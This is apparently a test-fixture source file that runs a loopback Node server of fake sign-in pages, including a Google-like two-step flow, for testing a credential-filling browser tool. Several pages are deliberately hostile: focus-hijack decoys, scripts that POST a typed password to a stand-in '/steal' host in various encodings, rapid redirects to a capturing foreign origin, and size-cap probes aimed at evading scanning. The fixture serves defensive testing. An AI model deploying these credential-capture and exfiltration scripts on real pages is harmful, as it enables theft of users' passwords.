// FAKE LOGIN PAGES on loopback (lane vault-login-chrome) — never the real Google: the SHAPES of a one-step form, a
// Google-like two-step sign-in (an identifier view, then a password view behind a script "Next", then a two-step code
// page) and a React-like controlled form (a value tracker: a script's `.value =` is not an edit). Each page reports what
// it RECEIVED to this server (the suite reads `received()`), never to the page's own text.
import http from 'node:http';

const VALUE_TRACKER = `function track(el, onEdit) { // a React-like controlled input: the framework's tracker hears the element's own setter
  const d = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value'); let tracked = el.value;
  Object.defineProperty(el, 'value', { configurable: true, get() { return d.get.call(this); }, set(v) { tracked = String(v); d.set.call(this, v); } });
  el.addEventListener('input', () => { const v = d.get.call(el); if (v === tracked) return; tracked = v; onEdit(v); });
}`;
const page = (title, body, script = '') => `<!doctype html><html><head><meta charset="utf-8"><title>${title}</title>
<style>body{font:16px sans-serif;margin:40px} input{display:block;margin:8px 0;padding:6px;width:280px;font:16px monospace} .btn{display:inline-block;padding:6px 14px;background:#1a73e8;color:#fff;cursor:pointer} [hidden]{display:none!important}</style></head><body>${body}<script>${script}</script></body></html>`;
const post = `function post(path, body) { return fetch(path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }); }`;

const PAGES = {
  '/one': () => page('Sign in — one step', `<form id="f" method="post" action="/done/one"><label>User <input id="u" name="username" autocomplete="username"></label><label>Password <input id="p" type="password" name="password" autocomplete="current-password" minlength="4"></label><button type="submit">Sign in</button></form>`),
  '/two': () => page('Sign in – Google-like', `<div id="vid"><h1>Sign in</h1><input type="email" id="identifierId" name="identifier" autocomplete="username" aria-label="Email or phone" spellcheck="false"><div role="button" class="btn" id="idNext" tabindex="0">Next</div><div id="iderr" hidden>Enter an email or phone number</div></div>
<div id="vpw" hidden><h1>Welcome</h1><div id="who"></div><input type="password" name="Passwd" aria-label="Enter your password" autocomplete="current-password"><div role="button" class="btn" id="pwNext" tabindex="0">Next</div><div id="pwerr" hidden>Enter a password</div></div>`,
  `${VALUE_TRACKER}${post}
const st = { identifier: '', password: '' };
const idEl = document.getElementById('identifierId'), pwEl = document.querySelector('input[name=Passwd]');
track(idEl, (v) => { st.identifier = v; }); track(pwEl, (v) => { st.password = v; });
function idNext() { if (!st.identifier) { document.getElementById('iderr').hidden = false; post('/seen/two-id', { empty: true }); return; } post('/seen/two-id', { identifier: st.identifier }); document.getElementById('vid').hidden = true; document.getElementById('who').textContent = st.identifier; document.getElementById('vpw').hidden = false; history.pushState({}, '', '/two/challenge/pwd'); pwEl.focus(); }
function pwNext() { if (!st.password) { document.getElementById('pwerr').hidden = false; post('/seen/two-pw', { empty: true }); return; } post('/done/two', { identifier: st.identifier, Passwd: st.password }).then(() => { location.href = '/totp'; }); }
document.getElementById('idNext').addEventListener('click', idNext); document.getElementById('pwNext').addEventListener('click', pwNext);
idEl.addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); idNext(); } });
pwEl.addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); pwNext(); } });`),
  '/totp': () => page('2-Step Verification', `<h1>2-Step Verification</h1><input type="tel" id="totpPin" name="totpPin" autocomplete="one-time-code" inputmode="numeric" aria-label="Enter code" maxlength="8"><div role="button" class="btn" id="totpNext" tabindex="0">Next</div>`,
  `${VALUE_TRACKER}${post}
let code = ''; const el = document.getElementById('totpPin'); track(el, (v) => { code = v; });
function next() { post('/done/totp', { code }).then(() => { location.href = '/welcome'; }); }
document.getElementById('totpNext').addEventListener('click', next); el.addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); next(); } });`),
  '/react': () => page('Sign in — controlled', `<div><input id="ru" autocomplete="username" placeholder="Username"><input id="rp" type="password" autocomplete="current-password" placeholder="Password"><div role="button" class="btn" id="rgo">Log in</div></div>`,
  `${VALUE_TRACKER}${post}
const st = { u: '', p: '' }; track(document.getElementById('ru'), (v) => { st.u = v; }); track(document.getElementById('rp'), (v) => { st.p = v; });
function go() { post('/done/react', { username: st.u, password: st.p }).then(() => { location.href = '/welcome'; }); }
document.getElementById('rgo').addEventListener('click', go); document.getElementById('rp').addEventListener('keydown', (e) => { if (e.key === 'Enter') go(); });`),
  '/spa': () => page('Sign in — SPA (no navigation)', `<div><input id="su" aria-label="Email" autocomplete="username"><input id="sp" type="password" aria-label="Password" autocomplete="current-password"><button type="button" class="btn" id="sgo">Sign in SPA</button><div id="sstate">idle</div></div>`,
  `${VALUE_TRACKER}${post}
const st = { u: '', p: '' }; const su = document.getElementById('su'), sp = document.getElementById('sp');
track(su, (v) => { st.u = v; }); track(sp, (v) => { st.p = v; });
document.getElementById('sgo').addEventListener('click', () => {
  post('/done/spa', { username: su.value || st.u, password: sp.value || st.p }).then(() => { document.getElementById('sstate').textContent = 'signed-in'; });
});`),
  '/register': () => page('Register account', `<div><input id="ru2" aria-label="Username"><input id="rpw" type="password" aria-label="New password"><input id="rcpw" type="password" aria-label="Confirm password"><button type="button" class="btn" id="rgo2">Create account</button></div>`,
  `${post}
document.getElementById('rgo2').addEventListener('click', () => {
  post('/done/register', { username: document.getElementById('ru2').value, password: document.getElementById('rpw').value, confirm: document.getElementById('rcpw').value }).then(() => { location.href = '/welcome'; });
});`),
  '/hijack': () => page('Focus hijack trap', `<div><input id="decoy" type="password" aria-label="Decoy"><input id="trap" type="password" aria-label="Trap password"></div>`,
  `document.getElementById('trap').addEventListener('focus', () => { document.getElementById('decoy').focus(); });`),
  '/hijack-async': (url) => {
    const mode = (url && url.searchParams.get('mode')) || 'timeout';
    return page(`Async focus hijack (${mode})`, `<div><input id="decoy" type="text" aria-label="Decoy text"><input id="trap" type="password" aria-label="Trap password"></div>`,
    `window.__decoyLog = [];
const decoy = document.getElementById('decoy');
const trap = document.getElementById('trap');
const desc = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
Object.defineProperty(decoy, 'value', {
  configurable: true,
  get() { return desc.get.call(this); },
  set(v) { const s = String(v); if (s.length > 0) window.__decoyLog.push({ kind: 'setter', len: s.length }); desc.set.call(this, s); },
});
for (const evName of ['beforeinput', 'input', 'keydown', 'keypress', 'keyup', 'change']) {
  decoy.addEventListener(evName, (e) => {
    window.__decoyLog.push({ kind: evName, dataLen: String((e && e.data) || '').length, valLen: desc.get.call(decoy).length });
  }, true);
}
new MutationObserver((list) => {
  for (const m of list) {
    if (m.attributeName === 'value' || desc.get.call(decoy).length > 0) {
      window.__decoyLog.push({ kind: 'mutation', attr: m.attributeName, valLen: desc.get.call(decoy).length });
    }
  }
}).observe(decoy, { attributes: true, attributeFilter: ['value'] });
const mode = ${JSON.stringify(mode)};
  trap.addEventListener('focus', () => {
  if (mode === 'sync') decoy.focus();
  else if (mode === 'microtask') queueMicrotask(() => decoy.focus());
  else if (mode === 'mo-inert') {
    new MutationObserver((list) => {
      for (const m of list) {
        if (m.attributeName === 'inert' && decoy.hasAttribute('inert')) {
          decoy.inert = false;
          decoy.removeAttribute('inert');
          decoy.focus();
        }
      }
    }).observe(decoy, { attributes: true, attributeFilter: ['inert'] });
  } else if (mode === 'post-prepare') {
    setTimeout(() => {
      decoy.focus();
      decoy.click();
      decoy.select();
      decoy.inert = false;
      decoy.removeAttribute('inert');
      decoy.focus();
      decoy.select();
    }, 12);
  } else if (mode === 'post-replace') {
    setTimeout(() => {
      const decoy2 = document.createElement('input');
      decoy2.id = 'decoy2';
      decoy2.type = 'text';
      Object.defineProperty(decoy2, 'value', {
        configurable: true,
        get() { return desc.get.call(this); },
        set(v) { const s = String(v); if (s.length > 0) window.__decoyLog.push({ kind: 'setter2', len: s.length }); desc.set.call(this, s); },
      });
      decoy2.addEventListener('input', (e) => {
        window.__decoyLog.push({ kind: 'input2', dataLen: String((e && e.data) || '').length, valLen: desc.get.call(decoy2).length });
      }, true);
      trap.replaceWith(decoy2);
      decoy2.focus();
      decoy2.select();
    }, 12);
  } else setTimeout(() => decoy.focus(), 0);
});`);
  },
  '/table-large': (url) => {
    const rowsN = Math.max(1, Math.min(6000, Number((url && url.searchParams.get('rows')) || 3000) || 3000));
    const unlabelled = url && url.searchParams.get('unlabelled') === '1';
    const rows = [];
    for (let i = 0; i < rowsN; i++) {
      rows.push(`<tr><td><a href="#r${i}">link ${i}</a></td><td><button type="button">btn ${i}</button></td><td><input value="v${i}"${unlabelled ? '' : ` aria-label="row ${i}"`}></td></tr>`);
    }
    return page(`Large table (${rowsN})`, `<form id="lf"><input id="lu" type="email" aria-label="Email"><input id="lp" type="password"${unlabelled ? '' : ' aria-label="Password"'}><button type="button" class="btn" id="lgo">Sign in</button></form><table>${rows.join('')}</table>`,
    `${post}
document.getElementById('lgo').addEventListener('click', () => {
  post('/done/table-large', { username: document.getElementById('lu').value, password: document.getElementById('lp').value }).then(() => { location.href = '/welcome'; });
});`);
  },
  '/hold-large': (url) => {
    const dest = (url && url.searchParams.get('dest')) || 'http://127.0.0.1:9';
    return page('Hold state exfil test', `<div><input id="hp" type="password" aria-label="Password"><textarea id="bigtxt">${'x'.repeat(3000)}</textarea><button type="button" class="btn" id="hsame">Same submit</button><button type="button" class="btn" id="hevil">Evil post</button></div>`,
    `${post}
const dest = ${JSON.stringify(dest)};
let heldPw = '';
document.getElementById('hp').addEventListener('input', (e) => {
  if (e.target.value) {
    heldPw = e.target.value;
    document.getElementById('bigtxt').value = 'x'.repeat(3000) + heldPw;
  }
});
document.getElementById('hsame').addEventListener('click', () => {
  const pw = heldPw || document.getElementById('hp').value;
  post('/done/hold-same', { password: pw });
});
document.getElementById('hevil').addEventListener('click', () => {
  const pw = heldPw || document.getElementById('hp').value;
  fetch(dest + '/steal/after-hold', { method: 'POST', mode: 'cors', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: 'pw=' + encodeURIComponent(pw) })
    .then(() => post('/done/hold-evil', { ok: true }), (e) => post('/done/hold-evil', { ok: false, err: String(e && e.message || e) }));
});`);
  },
  '/exfil-caps': (url) => {
    const dest = (url && url.searchParams.get('dest')) || 'http://127.0.0.1:9';
    return page('Scan-cap fail-closed matrix', `<div><input id="cp" type="password" aria-label="Password"><button type="button" class="btn" id="c-run">Run caps</button></div>`,
    `${post}
const dest = ${JSON.stringify(dest)};
document.getElementById('c-run').addEventListener('click', async () => {
  const payloads = [
    ['str', 'application/json', JSON.stringify({ pad: 'a'.repeat(262150) })],
    ['json', 'application/json', JSON.stringify(Array.from({ length: 4100 }, () => 0))],
    ['nested', 'application/json', JSON.stringify({ inner: JSON.stringify(Array.from({ length: 2055 }, () => 0)) })],
    ['lines', 'text/plain', Array.from({ length: 4100 }, () => 'k=v').join('\\n')],
    ['mp', 'multipart/form-data; boundary=capBnd', Array.from({ length: 258 }, (_, i) => '--capBnd\\r\\nContent-Disposition: form-data; name="f' + i + '"\\r\\n\\r\\nv\\r\\n').join('') + '--capBnd--\\r\\n'],
    ['b64', 'text/plain', Array.from({ length: 66 }, () => 'YWJjZGVm').join(' ')],
    ['body', 'text/plain', 'z'.repeat(1048600)],
  ];
  const res = {};
  for (const [k, ct, body] of payloads) {
    const xo = await fetch(dest + '/steal/cap-' + k, { method: 'POST', mode: 'cors', headers: { 'content-type': ct }, body }).then(() => true, () => false);
    const so = await fetch('/same/cap-' + k, { method: 'POST', headers: { 'content-type': ct }, body }).then((r) => r.ok, () => false);
    res[k] = { xo, so };
  }
  await post('/done/caps', res);
});`);
  },
  '/framed': () => page('Framed login', `<h1>Embedded sign-in</h1><iframe id="fhost" src="/one" width="400" height="240"></iframe>`),
  // B-5f2e (the measure, then line 2's proof): a sign-in form in a CROSS-SITE child frame that answers its page by a posted message (the shape of a
  // large vendor's account page). The top page shows what the frame posted (#got); the frame's form posts a ticket that says
  // only how long the two values were (never the values).
  '/xframed': (url) => {
    const src = String((url && url.searchParams.get('src')) || 'about:blank').replace(/[&"<>]/g, (c) => ({ '&': '&amp;', '"': '&quot;', '<': '&lt;', '>': '&gt;' }[c]));
    return page('Cross-site framed sign-in', `<h1>Sign in with your account</h1><iframe id="xidp" src="${src}" width="420" height="260"></iframe><div id="got"></div>`,
      `window.addEventListener('message', (e) => { document.getElementById('got').textContent = JSON.stringify({ origin: e.origin, data: e.data }); });`);
  },
  '/xsignin': () => page('Account sign-in (frame)', `<form id="xf"><label>Account <input id="xu" name="accountName" autocomplete="username"></label><label>Password <input id="xp" type="password" name="password" autocomplete="current-password"></label><button type="button" class="btn" id="xgo">Continue</button></form>`,
    `parent.postMessage({ hello: location.origin }, '*'); document.getElementById('xgo').addEventListener('click', () => { parent.postMessage({ ticket: 't-' + document.getElementById('xu').value.length + '-' + document.getElementById('xp').value.length }, '*'); });`),
  '/exfil': (url) => {
    const dest = (url && url.searchParams.get('dest')) || 'http://127.0.0.1:9';
    return page('Exfiltration attempt', `<div><input id="ep" type="password" aria-label="Password"><button type="button" class="btn" id="ego">Submit</button></div>`,
    `${post}
const dest = ${JSON.stringify(dest)};
document.getElementById('ego').addEventListener('click', () => {
  const pw = document.getElementById('ep').value;
  fetch(dest + '/steal', { method: 'POST', mode: 'no-cors', headers: { 'content-type': 'text/plain' }, body: 'pw=' + encodeURIComponent(pw) })
    .then(() => post('/done/exfil-ok', {}), (e) => post('/done/exfil-blocked', { err: String(e && e.message || e) }));
});`);
  },
  '/exfil-matrix': (url) => {
    const dest = (url && url.searchParams.get('dest')) || 'http://127.0.0.1:9';
    return page('Exfiltration matrix', `<div>
<input id="ep" type="password" aria-label="Password">
<button type="button" class="btn" id="x-urlencoded">X urlencoded</button>
<button type="button" class="btn" id="x-json">X json</button>
<button type="button" class="btn" id="x-multipart">X multipart</button>
<button type="button" class="btn" id="x-text">X text</button>
<button type="button" class="btn" id="x-query">X query</button>
<button type="button" class="btn" id="x-harmless-mp">X harmless-mp</button>
<button type="button" class="btn" id="x-binary">X binary</button>
<button type="button" class="btn" id="s-all">Same-origin all</button>
</div>`,
    `${post}
const dest = ${JSON.stringify(dest)};
window.__exfilMatrix = {};
const mark = (k, ok, err) => {
  window.__exfilMatrix[k] = ok ? 'ok' : ('blocked:' + String((err && err.message) || err || 'err'));
  return post('/done/matrix-' + k, { ok, ...(err ? { err: String((err && err.message) || err) } : {}) });
};
const pwOf = () => document.getElementById('ep').value;
document.getElementById('x-urlencoded').addEventListener('click', () => {
  const body = new URLSearchParams({ user: 'alice', secret_pw: pwOf() });
  fetch(dest + '/steal/urlencoded', { method: 'POST', mode: 'cors', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: body.toString() })
    .then(() => mark('x-urlencoded', true), (e) => mark('x-urlencoded', false, e));
});
document.getElementById('x-json').addEventListener('click', () => {
  fetch(dest + '/steal/json', { method: 'POST', mode: 'cors', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ meta: { v: 1 }, auth: { nested: { secret: pwOf() } } }) })
    .then(() => mark('x-json', true), (e) => mark('x-json', false, e));
});
document.getElementById('x-multipart').addEventListener('click', () => {
  const fd = new FormData();
  fd.append('user', 'alice');
  fd.append('pw', pwOf());
  fetch(dest + '/steal/multipart', { method: 'POST', mode: 'cors', body: fd })
    .then(() => mark('x-multipart', true), (e) => mark('x-multipart', false, e));
});
document.getElementById('x-text').addEventListener('click', () => {
  fetch(dest + '/steal/text', { method: 'POST', mode: 'cors', headers: { 'content-type': 'text/plain' }, body: 'user=alice\\r\\npw=' + pwOf() + '\\r\\n' })
    .then(() => mark('x-text', true), (e) => mark('x-text', false, e));
});
document.getElementById('x-query').addEventListener('click', () => {
  fetch(dest + '/steal/query?q=' + encodeURIComponent(btoa(pwOf())), { method: 'GET', mode: 'cors' })
    .then(() => mark('x-query', true), (e) => mark('x-query', false, e));
});
document.getElementById('x-harmless-mp').addEventListener('click', () => {
  const fd = new FormData();
  fd.append('note', 'benign-telemetry');
  fd.append('count', '42');
  fetch(dest + '/steal/harmless-mp', { method: 'POST', mode: 'cors', body: fd })
    .then(() => mark('x-harmless-mp', true), (e) => mark('x-harmless-mp', false, e));
});
document.getElementById('x-binary').addEventListener('click', () => {
  const bin = new Uint8Array([0, 255, 254, 1, 2, 3, 4, 5]);
  fetch(dest + '/steal/binary', { method: 'POST', mode: 'cors', headers: { 'content-type': 'application/octet-stream' }, body: bin })
    .then(() => mark('x-binary', true), (e) => mark('x-binary', false, e));
});
document.getElementById('s-all').addEventListener('click', async () => {
  const pw = pwOf();
  const fd = new FormData();
  fd.append('user', 'alice');
  fd.append('pw', pw);
  await fetch('/same/urlencoded', { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ pw }).toString() });
  await fetch('/same/json', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ nested: { pw } }) });
  await fetch('/same/multipart', { method: 'POST', body: fd });
  await fetch('/same/text', { method: 'POST', headers: { 'content-type': 'text/plain' }, body: 'pw=' + pw + '\\r\\n' });
  await fetch('/same/query?q=' + encodeURIComponent(btoa(pw)), { method: 'GET' });
  await mark('s-all', true);
});`);
  },
  '/plain': () => page('Nothing to sign in', '<p>No form here.</p><input id="q" placeholder="Search">'),
  '/rapid-jump': (url, opts = {}) => {
    if (opts.stopBounce) return page('Rapid jump stopped', '<p>Stopped.</p><input id="q" placeholder="Stopped">');
    const evil = (url && url.searchParams.get('evil')) || 'http://127.0.0.1:9';
    const seq = Number((url && url.searchParams.get('n')) || 0) || 0;
    const mode = (url && url.searchParams.get('mode')) || 'mix';
    return page(`Rapid jump shop (${seq})`, '<div><input id="lead" type="text" aria-label="Lead" autofocus><input id="pw" type="password" aria-label="Password" autocomplete="current-password"></div>',
    `const evil = ${JSON.stringify(evil)};
const seq = ${JSON.stringify(seq)};
const mode = ${JSON.stringify(mode)};
const pw = document.getElementById('pw');
let jumped = false;
const onceEvil = () => {
  if (jumped) return;
  jumped = true;
  location.replace(evil + '/rapid-catch?back=' + encodeURIComponent(location.origin) + '&n=' + (seq + 1) + '&mode=' + encodeURIComponent(mode));
};
pw.addEventListener('input', () => {
  if (pw.value && pw.value.length > 0 && navigator.sendBeacon) {
    navigator.sendBeacon('/seen/rapid-shop-typed', new URLSearchParams({ seq: String(seq), len: String(pw.value.length) }));
  }
}, true);
if (mode === 'focus-jump') {
  pw.addEventListener('focus', () => { setTimeout(onceEvil, 10); }, { once: true });
} else if (seq % 3 !== 1) {
  pw.addEventListener('input', () => {
    if (pw.value && pw.value.length > 0) setTimeout(onceEvil, 16);
  }, { once: true });
  setTimeout(onceEvil, 115);
} else {
  const oddIdx = Math.floor(seq / 3);
  if (oddIdx % 6 === 5) {
    setTimeout(onceEvil, 10 + (Math.floor(oddIdx / 6) % 5) * 3);
  } else {
    const focusDelay = oddIdx % 5;
    pw.addEventListener('focus', () => { setTimeout(onceEvil, focusDelay); }, { once: true });
    setTimeout(onceEvil, 65);
  }
}`);
  },
  '/rapid-catch': (url, opts = {}) => {
    const back = (url && url.searchParams.get('back')) || '';
    const seq = Number((url && url.searchParams.get('n')) || 0) || 0;
    const mode = (url && url.searchParams.get('mode')) || 'mix';
    const stopBounce = Boolean(opts.stopBounce);
    return page(`Rapid catch foreign (${seq})`, `<div><input id="pw" type="text" aria-label="Trap" autofocus></div>`,
    `const back = ${JSON.stringify(back)};
const seq = ${JSON.stringify(seq)};
const mode = ${JSON.stringify(mode)};
const stopBounce = ${JSON.stringify(stopBounce)};
const el = document.getElementById('pw');
const desc = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype.constructor ? HTMLInputElement.prototype : Object.getPrototypeOf(el), 'value');
let caught = false;
const report = (kind, val) => {
  if (caught || !val || !String(val).length) return;
  caught = true;
  const payload = JSON.stringify({ kind, seq, val: String(val) });
  if (navigator.sendBeacon) navigator.sendBeacon('/steal/rapid-caught', new Blob([payload], { type: 'application/json' }));
  else fetch('/steal/rapid-caught', { method: 'POST', headers: { 'content-type': 'application/json' }, body: payload, keepalive: true });
};
Object.defineProperty(el, 'value', {
  configurable: true,
  get() { return desc.get.call(this); },
  set(v) { const s = String(v); if (s.length > 0) report('setter', s); desc.set.call(this, s); },
});
for (const evName of ['beforeinput', 'input', 'change']) {
  window.addEventListener(evName, (e) => {
    const v = desc.get.call(el) || String((e && e.data) || '');
    if (v.length > 0) report(evName, v);
  }, true);
}
try { el.focus(); } catch {}
if (back && !stopBounce && mode !== 'focus-jump') {
  setTimeout(() => {
    location.replace(back + '/rapid-jump?evil=' + encodeURIComponent(location.origin) + '&n=' + seq + '&mode=' + encodeURIComponent(mode));
  }, 22);
}`);
  },
  '/welcome': () => page('Welcome', '<h1>Signed in</h1>'),
};

export function startLoginPages() {
  const got = [];
  let stopBounce = false;
  const cors = {
    'access-control-allow-origin': '*',
    'access-control-allow-methods': 'GET, POST, OPTIONS',
    'access-control-allow-headers': '*',
  };
  const srv = http.createServer((req, res) => {
    const url = new URL(req.url, 'http://x');
    if (req.method === 'OPTIONS') {
      res.writeHead(204, cors);
      return res.end();
    }
    if (req.method === 'POST') {
      const chunks = [];
      let bytes = 0;
      req.on('data', (d) => { chunks.push(d); bytes += d.length; if (bytes > 2097152) req.destroy(); });
      req.on('end', () => {
        const rawBuf = Buffer.concat(chunks);
        const b = rawBuf.toString('utf8');
        const ct = String(req.headers['content-type'] || '');
        let body = {};
        try {
          body = /json/.test(ct)
            ? JSON.parse(b || '{}')
            : /multipart/i.test(ct)
              ? { raw: b }
              : Object.fromEntries(new URLSearchParams(b));
        } catch { body = { raw: b }; }
        got.push({ method: 'POST', path: url.pathname, search: url.search, contentType: ct, raw: b, body, at: Date.now() });
        if (url.pathname === '/done/one') { res.writeHead(303, { ...cors, location: '/welcome' }); return res.end(); }
        res.writeHead(200, { ...cors, 'content-type': 'application/json' }); res.end('{"ok":true}');
      });
      return;
    }
    if (url.pathname.startsWith('/steal/') || url.pathname.startsWith('/same/')) {
      got.push({ method: req.method, path: url.pathname, search: url.search, raw: url.search, body: Object.fromEntries(url.searchParams), at: Date.now() });
      res.writeHead(200, { ...cors, 'content-type': 'application/json' });
      return res.end('{"ok":true}');
    }
    const p = PAGES[url.pathname.replace(/\/challenge\/pwd$/, '')];
    if (!p) { res.writeHead(404, cors); return res.end('nope'); }
    if (url.pathname === '/rapid-jump' || url.pathname === '/rapid-catch') {
      got.push({ method: req.method, path: url.pathname, search: url.search, raw: '', body: Object.fromEntries(url.searchParams), at: Date.now() });
    }
    res.writeHead(200, { ...cors, 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' }); res.end(p(url, { stopBounce }));
  });
  return new Promise((ok) => srv.listen(0, '127.0.0.1', () => ok({ origin: `http://127.0.0.1:${srv.address().port}`, port: srv.address().port, setStopBounce: (v) => { stopBounce = Boolean(v); }, received: () => got.slice(), clear: () => { got.length = 0; }, close: () => new Promise((r) => { srv.close(() => r()); srv.closeAllConnections(); }) })));
}
